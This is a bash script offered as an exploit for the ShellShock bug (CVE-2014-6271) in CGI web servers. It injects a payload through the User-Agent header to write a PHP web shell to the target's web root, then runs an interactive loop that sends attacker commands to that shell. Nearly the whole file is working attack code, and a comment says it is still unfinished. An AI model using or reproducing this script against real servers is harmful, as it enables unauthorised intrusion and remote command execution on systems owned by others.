#!/bin/bash
#
# CVE-2014-6271
# ShellShock Exploit
# https://nvd.nist.gov/vuln/detail/CVE-2014-6271
#
# ALMOST DONE> STILL WORKING ON UPLOADING A WEBSHELL TO USE FOR COMMAND INJECITON
#
# Allow Ctrl+C to kill pingsweep
trap '
  trap - INT # restore default INT handler
    kill -s INT "$$"
    ' INT

if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ] ; then
                # This option displays a help message and command execution examples
                echo ""
                echo "OsbornePro CVE-2014-6271 1.0 ( https://roberthosborne.com )"
                echo ""
                echo "USAGE: CVE-2014-6271 -i <target ip> -p <port> -u <uri>"
                echo ""
                echo "OPTIONS:"
                echo "  -h : Displays the help information for the command."
                echo "  -i : Defines the ip address of the target"
                echo "  -p : Defines the port the web server is running on"
                echo "  -u : Defines the URI that is exploitable to ShellShock"
                echo ""
                echo "EXAMPLES:"
                echo "  CVE-2014-6271 -i 10.10.10.10 -p 8080 -u '/cgi-bin/index.cgi'"
                echo "  # This example exploits shell shock at http://10.10.10.10.:8080/cgi-bin/index.cgi"
                echo ""
                exit
fi

while getopts ":i:p:u:" OPT; do
        case $OPT in
                i) ip=$OPTARG;;
                p) port=$OPTARG;;
		u) uri=$OPTARG;;
        esac
done

if [ -z "$ip" ]
then
	printf "[!] Please define the ip address or hostname of the target\n"	
	exit
fi

if [ -z "$port" ]
then
	printf "[*] A valid port was not defined\nSetting default value to 80"
	port=80
fi

if [ -z "$uri" ]
then
	printf "[*] No uri was defined. Setting default value to /cgi-bin/index.cgi\n"
	uri="/cgi-bin/index.cgi"
fi

printf "[*] Getting contents of webshell...\n"
printf "[*] Sending exploit...\n"

curl -H "user-agent: () { :;}; echo; echo; echo /bin/bash -c 'echo \'<?php if(isset($_REQUEST[\"cmd\"])){echo \"<pre>\";$cmd = ($_REQUEST[\"cmd\"]);system($cmd);echo \"</pre>\";die;} ?>\' > /var/www/html/simple.php'" http://${ip}:${port}${uri}

while :; do
	printf "[php-web-shell>]"
	read CMD
	curl --data-urlencode "cmd=$CMD" http://$ip:$port/simple.php
	printf "\n"
done
